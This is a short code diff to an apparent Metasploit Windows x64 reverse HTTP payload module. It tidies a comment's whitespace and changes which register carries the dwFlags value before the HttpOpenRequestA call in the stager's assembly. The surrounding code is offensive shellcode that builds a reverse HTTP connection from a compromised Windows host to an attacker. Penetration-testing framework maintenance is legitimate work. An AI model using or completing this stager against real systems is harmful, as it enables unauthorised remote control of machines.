@@ -233,7 +233,7 @@ module Payload::Windows::ReverseHttp_x64
     asm << %Q^
         xor r9, r9                    ; lpszProxyBypass (NULL)
         push rbx                      ; stack alignment
-        push rbx                       ; dwFlags (0)
+        push rbx                      ; dwFlags (0)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call rbp
 
@@ -305,8 +305,8 @@ module Payload::Windows::ReverseHttp_x64
         pop r8                        ; lpszObjectName (URI)
         xor r9, r9                    ; lpszVersion (NULL)
         push rbx                      ; dwContext (0)
-        mov r10, #{"0x%.8x" % http_open_flags}  ; dwFlags
-        push r10
+        mov rax, #{"0x%.8x" % http_open_flags}  ; dwFlags
+        push rax
         push rbx                      ; lplpszAcceptType (NULL)
         push rbx                      ; lpszReferer (NULL)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
